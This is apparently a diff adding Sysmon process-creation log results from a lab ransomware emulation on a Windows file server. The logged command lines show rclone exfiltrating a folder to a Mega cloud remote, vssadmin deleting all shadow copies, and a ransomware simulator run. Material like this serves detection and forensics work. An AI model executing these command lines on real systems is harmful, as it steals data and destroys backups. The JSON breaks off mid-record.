@@ -1,0 +1,1605 @@
+{
+  "behaviour": "process_creation",
+  "index": "logs-windows.sysmon_operational-*",
+  "identifier": {
+    "field": "process.parent.entity_id",
+    "value": "{88E52A21-807E-6B01-7C00-000000002300}",
+    "host": "fs01"
+  },
+  "alerts": [
+    "5f3a7ee8eee0504d77f96b4acf07438bc85406068ba247006560cfa47d56277e",
+    "ece333d397faf71f84ab2b0203f4834ac62c2280ecd18c8e849f5a89ae9f40ff",
+    "ff0e8ee01e3aa51b25cccc52dd61f44dcb3ca7891b443a479711bf489de9f93d"
+  ],
+  "queries": [
+    {
+      "query": {
+        "bool": {
+          "filter": [
+            {
+              "range": {
+                "@timestamp": {
+                  "gte": "2026-11-21T11:26:05.000Z",
+                  "lte": "2026-11-21T11:32:05.000Z"
+                }
+              }
+            },
+            {
+              "term": {
+                "host.name": "fs01"
+              }
+            },
+            {
+              "term": {
+                "event.code": "1"
+              }
+            },
+            {
+              "term": {
+                "process.parent.entity_id": "{88E52A21-807E-6B01-7C00-000000002300}"
+              }
+            }
+          ]
+        }
+      },
+      "window": {
+        "start": "2026-11-21T11:26:05.000Z",
+        "end": "2026-11-21T11:32:05.000Z"
+      },
+      "returned": 3,
+      "total": 3,
+      "relation": "eq"
+    },
+    {
+      "query": {
+        "bool": {
+          "filter": [
+            {
+              "range": {
+                "@timestamp": {
+                  "gte": "2026-11-21T11:26:05.000Z",
+                  "lte": "2026-11-21T11:32:05.000Z"
+                }
+              }
+            },
+            {
+              "term": {
+                "host.name": "fs01"
+              }
+            },
+            {
+              "term": {
+                "event.code": "1"
+              }
+            },
+            {
+              "term": {
+                "process.parent.entity_id": "{88E52A21-807E-6B01-7C00-000000002300}"
+              }
+            }
+          ]
+        }
+      },
+      "window": {
+        "start": "2026-11-21T11:26:05.000Z",
+        "end": "2026-11-21T11:32:05.000Z"
+      },
+      "returned": 3,
+      "total": 3,
+      "relation": "eq"
+    },
+    {
+      "query": {
+        "bool": {
+          "filter": [
+            {
+              "range": {
+                "@timestamp": {
+                  "gte": "2026-11-21T11:26:03.000Z",
+                  "lte": "2026-11-21T11:32:03.000Z"
+                }
+              }
+            },
+            {
+              "term": {
+                "host.name": "fs01"
+              }
+            },
+            {
+              "term": {
+                "event.code": "1"
+              }
+            },
+            {
+              "term": {
+                "process.parent.entity_id": "{88E52A21-807E-6B01-7C00-000000002300}"
+              }
+            }
+          ]
+        }
+      },
+      "window": {
+        "start": "2026-11-21T11:26:03.000Z",
+        "end": "2026-11-21T11:32:03.000Z"
+      },
+      "returned": 3,
+      "total": 3,
+      "relation": "eq"
+    }
+  ],
+  "returned": 9,
+  "truncated": false,
+  "sample": false,
+  "hits": [
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaH93u2TxY-KOnAA5eBp",
+      "_source": {
+        "agent": {
+          "name": "FS01",
+          "id": "c2752d54-6aa0-40f3-ab8e-4e7ec9092a55",
+          "type": "filebeat",
+          "ephemeral_id": "6fab4ab3-07bd-4e05-a902-393ba704c333",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\ProgramData\\rclone.exe",
+            "--config",
+            "C:\\ProgramData\\rclone.conf",
+            "copy",
+            "C:\\C0015\\corpus",
+            "Mega:DATA",
+            "-q",
+            "--ignore-existing",
+            "--auto-confirm"
+          ],
+          "parent": {
+            "args": [
+              "powershell",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-File",
+              "C:\\ProgramData\\fs01-task.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 1796,
+            "args_count": 6,
+            "entity_id": "{88E52A21-807E-6B01-7C00-000000002300}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "powershell  -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\fs01-task.ps1"
+          },
+          "pe": {
+            "file_version": "1.75.1",
+            "product": "Rclone",
+            "imphash": "70df50797f7a85a271c38135c5679c40",
+            "description": "Rclone",
+            "original_file_name": "rclone.exe",
+            "company": "https://rclone.org"
+          },
+          "name": "rclone.exe",
+          "pid": 3956,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 9,
+          "entity_id": "{88E52A21-807F-6B01-7D00-000000002300}",
+          "hash": {
+            "sha256": "033eee51c9ad47c2de2624b6674d355274bcd6cf0027a5f85db4437ba24ae81c"
+          },
+          "executable": "C:\\ProgramData\\rclone.exe",
+          "command_line": "\"C:\\ProgramData\\rclone.exe\" --config C:\\ProgramData\\rclone.conf copy C:\\C0015\\corpus Mega:DATA -q --ignore-existing --auto-confirm"
+        },
+        "winlog": {
+          "record_id": "883417",
+          "computer_name": "FS01.c0015.lab",
+          "process": {
+            "pid": 2552,
+            "thread": {
+              "id": 3700
+            }
+          },
+          "task": "Process Create (rule: ProcessCreate)",
+          "event_id": "1",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "https://rclone.org",
+            "LogonGuid": "{88E52A21-807E-6B01-9B5F-0E0000000000}",
+            "Description": "Rclone",
+            "TerminalSessionId": "0",
+            "IntegrityLevel": "High",
+            "Product": "Rclone",
+            "ParentUser": "C0015\\Administrator",
+            "FileVersion": "1.75.1",
+            "LogonId": "0xe5f9b"
+          },
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "opcode": "Info",
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          },
+          "version": 5
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "c2752d54-6aa0-40f3-ab8e-4e7ec9092a55",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-11-21 11:29:03.415\nProcessGuid: {88E52A21-807F-6B01-7D00-000000002300}\nProcessId: 3956\nImage: C:\\ProgramData\\rclone.exe\nFileVersion: 1.75.1\nDescription: Rclone\nProduct: Rclone\nCompany: https://rclone.org\nOriginalFileName: rclone.exe\nCommandLine: \"C:\\ProgramData\\rclone.exe\" --config C:\\ProgramData\\rclone.conf copy C:\\C0015\\corpus Mega:DATA -q --ignore-existing --auto-confirm\nCurrentDirectory: C:\\Windows\\system32\\\nUser: C0015\\Administrator\nLogonGuid: {88E52A21-807E-6B01-9B5F-0E0000000000}\nLogonId: 0xe5f9b\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: SHA256=033EEE51C9AD47C2DE2624B6674D355274BCD6CF0027A5F85DB4437BA24AE81C,IMPHASH=70DF50797F7A85A271C38135C5679C40\nParentProcessGuid: {88E52A21-807E-6B01-7C00-000000002300}\nParentProcessId: 1796\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: powershell  -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\fs01-task.ps1\nParentUser: C0015\\Administrator",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-11-21T11:29:03.415Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "Administrator"
+          ],
+          "hash": [
+            "033eee51c9ad47c2de2624b6674d355274bcd6cf0027a5f85db4437ba24ae81c",
+            "70df50797f7a85a271c38135c5679c40"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "FS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "family": "windows",
+            "type": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "192.168.106.155",
+            "192.168.50.30"
+          ],
+          "name": "fs01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-3B-C6-18",
+            "00-0C-29-3B-C6-22"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-11-21T11:29:07Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "created": "2026-11-21T11:29:05.440Z",
+          "kind": "event",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "C0015",
+          "name": "Administrator"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaH93u2TxY-KOnAA5eB-",
+      "_source": {
+        "agent": {
+          "name": "FS01",
+          "id": "c2752d54-6aa0-40f3-ab8e-4e7ec9092a55",
+          "ephemeral_id": "6fab4ab3-07bd-4e05-a902-393ba704c333",
+          "type": "filebeat",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\Windows\\system32\\vssadmin.exe",
+            "delete",
+            "shadows",
+            "/all",
+            "/quiet"
+          ],
+          "parent": {
+            "args": [
+              "powershell",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-File",
+              "C:\\ProgramData\\fs01-task.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 1796,
+            "args_count": 6,
+            "entity_id": "{88E52A21-807E-6B01-7C00-000000002300}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "powershell  -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\fs01-task.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.1 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "c1edc431cd345f0a0f32019895d13fce",
+            "description": "Command Line Interface for Microsoft\u00ae Volume Shadow Copy Service ",
+            "original_file_name": "VSSADMIN.EXE",
+            "company": "Microsoft Corporation"
+          },
+          "name": "vssadmin.exe",
+          "pid": 3788,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 5,
+          "entity_id": "{88E52A21-8081-6B01-7E00-000000002300}",
+          "hash": {
+            "sha256": "8c1fabcc2196e4d096b7d155837c5f699ad7f55edbf84571e4f8e03500b7a8b0"
+          },
+          "executable": "C:\\Windows\\System32\\vssadmin.exe",
+          "command_line": "\"C:\\Windows\\system32\\vssadmin.exe\" delete shadows /all /quiet"
+        },
+        "winlog": {
+          "record_id": "883437",
+          "computer_name": "FS01.c0015.lab",
+          "process": {
+            "pid": 2552,
+            "thread": {
+              "id": 3700
+            }
+          },
+          "task": "Process Create (rule: ProcessCreate)",
+          "event_id": "1",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "Description": "Command Line Interface for Microsoft\u00ae Volume Shadow Copy Service ",
+            "LogonGuid": "{88E52A21-807E-6B01-9B5F-0E0000000000}",
+            "TerminalSessionId": "0",
+            "IntegrityLevel": "High",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "ParentUser": "C0015\\Administrator",
+            "FileVersion": "10.0.19041.1 (WinBuild.160101.0800)",
+            "LogonId": "0xe5f9b"
+          },
+          "opcode": "Info",
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "version": 5,
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          }
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "c2752d54-6aa0-40f3-ab8e-4e7ec9092a55",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-11-21 11:29:05.349\nProcessGuid: {88E52A21-8081-6B01-7E00-000000002300}\nProcessId: 3788\nImage: C:\\Windows\\System32\\vssadmin.exe\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\nDescription: Command Line Interface for Microsoft\u00ae Volume Shadow Copy Service \nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: VSSADMIN.EXE\nCommandLine: \"C:\\Windows\\system32\\vssadmin.exe\" delete shadows /all /quiet\nCurrentDirectory: C:\\Windows\\system32\\\nUser: C0015\\Administrator\nLogonGuid: {88E52A21-807E-6B01-9B5F-0E0000000000}\nLogonId: 0xe5f9b\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: SHA256=8C1FABCC2196E4D096B7D155837C5F699AD7F55EDBF84571E4F8E03500B7A8B0,IMPHASH=C1EDC431CD345F0A0F32019895D13FCE\nParentProcessGuid: {88E52A21-807E-6B01-7C00-000000002300}\nParentProcessId: 1796\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: powershell  -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\fs01-task.ps1\nParentUser: C0015\\Administrator",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-11-21T11:29:05.349Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "Administrator"
+          ],
+          "hash": [
+            "8c1fabcc2196e4d096b7d155837c5f699ad7f55edbf84571e4f8e03500b7a8b0",
+            "c1edc431cd345f0a0f32019895d13fce"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "FS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "family": "windows",
+            "type": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "192.168.106.155",
+            "192.168.50.30"
+          ],
+          "name": "fs01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-3B-C6-18",
+            "00-0C-29-3B-C6-22"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-11-21T11:29:07Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "created": "2026-11-21T11:29:06.441Z",
+          "kind": "event",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "C0015",
+          "name": "Administrator"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaH93u2TxY-KOnAA5eCT",
+      "_source": {
+        "agent": {
+          "name": "FS01",
+          "id": "c2752d54-6aa0-40f3-ab8e-4e7ec9092a55",
+          "type": "filebeat",
+          "ephemeral_id": "6fab4ab3-07bd-4e05-a902-393ba704c333",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\ProgramData\\ransomware-sim.exe",
+            "-m",
+            "-net",
+            "-size",
+            "10",
+            "-nomutex",
+            "-p",
+            "C:\\C0015\\corpus"
+          ],
+          "parent": {
+            "args": [
+              "powershell",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-File",
+              "C:\\ProgramData\\fs01-task.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 1796,
+            "args_count": 6,
+            "entity_id": "{88E52A21-807E-6B01-7C00-000000002300}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "powershell  -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\fs01-task.ps1"
+          },
+          "pe": {
+            "imphash": "9b1c32c8188bab095286168e66414a26"
+          },
+          "name": "ransomware-sim.exe",
+          "pid": 4784,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 8,
+          "entity_id": "{88E52A21-8081-6B01-8100-000000002300}",
+          "hash": {
+            "sha256": "3c44c9b44fe5c6caf63fde9ac13a73f8c471f13f01bbf08eebedb98742e12441"
+          },
+          "executable": "C:\\ProgramData\\ransomware-sim.exe",
+          "command_line": "\"C:\\ProgramData\\ransomware-sim.exe\" -m -net -size 10 -nomutex -p C:\\C0015\\corpus"
+        },
+        "winlog": {
+          "record_id": "883458",
+          "computer_name": "FS01.c0015.lab",
+          "process": {
+            "pid": 2552,
+            "thread": {
+              "id": 3700
+            }
+          },
+          "event_id": "1",
+          "task": "Process Create (rule: ProcessCreate)",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "LogonGuid": "{88E52A21-807E-6B01-9B5F-0E0000000000}",
+            "IntegrityLevel": "High",
+            "TerminalSessionId": "0",
+            "ParentUser": "C0015\\Administrator",
+            "LogonId": "0xe5f9b"
+          },
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "opcode": "Info",
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          },
+          "version": 5
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "c2752d54-6aa0-40f3-ab8e-4e7ec9092a55",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-11-21 11:29:05.443\nProcessGuid: {88E52A21-8081-6B01-8100-000000002300}\nProcessId: 4784\nImage: C:\\ProgramData\\ransomware-sim.exe\nFileVersion: -\nDescription: -\nProduct: -\nCompany: -\nOriginalFileName: -\nCommandLine: \"C:\\ProgramData\\ransomware-sim.exe\" -m -net -size 10 -nomutex -p C:\\C0015\\corpus\nCurrentDirectory: C:\\Windows\\system32\\\nUser: C0015\\Administrator\nLogonGuid: {88E52A21-807E-6B01-9B5F-0E0000000000}\nLogonId: 0xe5f9b\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: SHA256=3C44C9B44FE5C6CAF63FDE9AC13A73F8C471F13F01BBF08EEBEDB98742E12441,IMPHASH=9B1C32C8188BAB095286168E66414A26\nParentProcessGuid: {88E52A21-807E-6B01-7C00-000000002300}\nParentProcessId: 1796\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: powershell  -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\fs01-task.ps1\nParentUser: C0015\\Administrator",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-11-21T11:29:05.443Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "Administrator"
+          ],
+          "hash": [
+            "3c44c9b44fe5c6caf63fde9ac13a73f8c471f13f01bbf08eebedb98742e12441",
+            "9b1c32c8188bab095286168e66414a26"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "FS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "family": "windows",
+            "type": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "192.168.106.155",
+            "192.168.50.30"
+          ],
+          "name": "fs01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-3B-C6-18",
+            "00-0C-29-3B-C6-22"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-11-21T11:29:07Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "kind": "event",
+          "created": "2026-11-21T11:29:06.441Z",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "C0015",
+          "name": "Administrator"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaH93u2TxY-KOnAA5eBp",
+      "_source": {
+        "agent": {
+          "name": "FS01",
+          "id": "c2752d54-6aa0-40f3-ab8e-4e7ec9092a55",
+          "type": "filebeat",
+          "ephemeral_id": "6fab4ab3-07bd-4e05-a902-393ba704c333",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\ProgramData\\rclone.exe",
+            "--config",
+            "C:\\ProgramData\\rclone.conf",
+            "copy",
+            "C:\\C0015\\corpus",
+            "Mega:DATA",
+            "-q",
+            "--ignore-existing",
+            "--auto-confirm"
+          ],
+          "parent": {
+            "args": [
+              "powershell",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-File",
+              "C:\\ProgramData\\fs01-task.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 1796,
+            "args_count": 6,
+            "entity_id": "{88E52A21-807E-6B01-7C00-000000002300}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "powershell  -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\fs01-task.ps1"
+          },
+          "pe": {
+            "file_version": "1.75.1",
+            "product": "Rclone",
+            "imphash": "70df50797f7a85a271c38135c5679c40",
+            "description": "Rclone",
+            "original_file_name": "rclone.exe",
+            "company": "https://rclone.org"
+          },
+          "name": "rclone.exe",
+          "pid": 3956,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 9,
+          "entity_id": "{88E52A21-807F-6B01-7D00-000000002300}",
+          "hash": {
+            "sha256": "033eee51c9ad47c2de2624b6674d355274bcd6cf0027a5f85db4437ba24ae81c"
+          },
+          "executable": "C:\\ProgramData\\rclone.exe",
+          "command_line": "\"C:\\ProgramData\\rclone.exe\" --config C:\\ProgramData\\rclone.conf copy C:\\C0015\\corpus Mega:DATA -q --ignore-existing --auto-confirm"
+        },
+        "winlog": {
+          "record_id": "883417",
+          "computer_name": "FS01.c0015.lab",
+          "process": {
+            "pid": 2552,
+            "thread": {
+              "id": 3700
+            }
+          },
+          "task": "Process Create (rule: ProcessCreate)",
+          "event_id": "1",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "https://rclone.org",
+            "LogonGuid": "{88E52A21-807E-6B01-9B5F-0E0000000000}",
+            "Description": "Rclone",
+            "TerminalSessionId": "0",
+            "IntegrityLevel": "High",
+            "Product": "Rclone",
+            "ParentUser": "C0015\\Administrator",
+            "FileVersion": "1.75.1",
+            "LogonId": "0xe5f9b"
+          },
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "opcode": "Info",
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          },
+          "version": 5
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "c2752d54-6aa0-40f3-ab8e-4e7ec9092a55",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-11-21 11:29:03.415\nProcessGuid: {88E52A21-807F-6B01-7D00-000000002300}\nProcessId: 3956\nImage: C:\\ProgramData\\rclone.exe\nFileVersion: 1.75.1\nDescription: Rclone\nProduct: Rclone\nCompany: https://rclone.org\nOriginalFileName: rclone.exe\nCommandLine: \"C:\\ProgramData\\rclone.exe\" --config C:\\ProgramData\\rclone.conf copy C:\\C0015\\corpus Mega:DATA -q --ignore-existing --auto-confirm\nCurrentDirectory: C:\\Windows\\system32\\\nUser: C0015\\Administrator\nLogonGuid: {88E52A21-807E-6B01-9B5F-0E0000000000}\nLogonId: 0xe5f9b\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: SHA256=033EEE51C9AD47C2DE2624B6674D355274BCD6CF0027A5F85DB4437BA24AE81C,IMPHASH=70DF50797F7A85A271C38135C5679C40\nParentProcessGuid: {88E52A21-807E-6B01-7C00-000000002300}\nParentProcessId: 1796\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: powershell  -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\fs01-task.ps1\nParentUser: C0015\\Administrator",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-11-21T11:29:03.415Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "Administrator"
+          ],
+          "hash": [
+            "033eee51c9ad47c2de2624b6674d355274bcd6cf0027a5f85db4437ba24ae81c",
+            "70df50797f7a85a271c38135c5679c40"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "FS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "family": "windows",
+            "type": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "192.168.106.155",
+            "192.168.50.30"
+          ],
+          "name": "fs01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-3B-C6-18",
+            "00-0C-29-3B-C6-22"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-11-21T11:29:07Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "created": "2026-11-21T11:29:05.440Z",
+          "kind": "event",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "C0015",
+          "name": "Administrator"
+        }
+      },
+      "query_index": 1
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaH93u2TxY-KOnAA5eB-",
+      "_source": {
+        "agent": {
+          "name": "FS01",
+          "id": "c2752d54-6aa0-40f3-ab8e-4e7ec9092a55",
+          "ephemeral_id": "6fab4ab3-07bd-4e05-a902-393ba704c333",
+          "type": "filebeat",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\Windows\\system32\\vssadmin.exe",
+            "delete",
+            "shadows",
+            "/all",
+            "/quiet"
+          ],
+          "parent": {
+            "args": [
+              "powershell",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-File",
+              "C:\\ProgramData\\fs01-task.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 1796,
+            "args_count": 6,
+            "entity_id": "{88E52A21-807E-6B01-7C00-000000002300}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "powershell  -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\fs01-task.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.1 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "c1edc431cd345f0a0f32019895d13fce",
+            "description": "Command Line Interface for Microsoft\u00ae Volume Shadow Copy Service ",
+            "original_file_name": "VSSADMIN.EXE",
+            "company": "Microsoft Corporation"
+          },
+          "name": "vssadmin.exe",
+          "pid": 3788,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 5,
+          "entity_id": "{88E52A21-8081-6B01-7E00-000000002300}",
+          "hash": {
+            "sha256": "8c1fabcc2196e4d096b7d155837c5f699ad7f55edbf84571e4f8e03500b7a8b0"
+          },
+          "executable": "C:\\Windows\\System32\\vssadmin.exe",
+          "command_line": "\"C:\\Windows\\system32\\vssadmin.exe\" delete shadows /all /quiet"
+        },
+        "winlog": {
+          "record_id": "883437",
+          "computer_name": "FS01.c0015.lab",
+          "process": {
+            "pid": 2552,
+            "thread": {
+              "id": 3700
+            }
+          },
+          "task": "Process Create (rule: ProcessCreate)",
+          "event_id": "1",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "Description": "Command Line Interface for Microsoft\u00ae Volume Shadow Copy Service ",
+            "LogonGuid": "{88E52A21-807E-6B01-9B5F-0E0000000000}",
+            "TerminalSessionId": "0",
+            "IntegrityLevel": "High",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "ParentUser": "C0015\\Administrator",
+            "FileVersion": "10.0.19041.1 (WinBuild.160101.0800)",
+            "LogonId": "0xe5f9b"
+          },
+          "opcode": "Info",
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "version": 5,
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          }
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "c2752d54-6aa0-40f3-ab8e-4e7ec9092a55",
+          "version": "9.5.3",
+          "snapshot": false
+        },
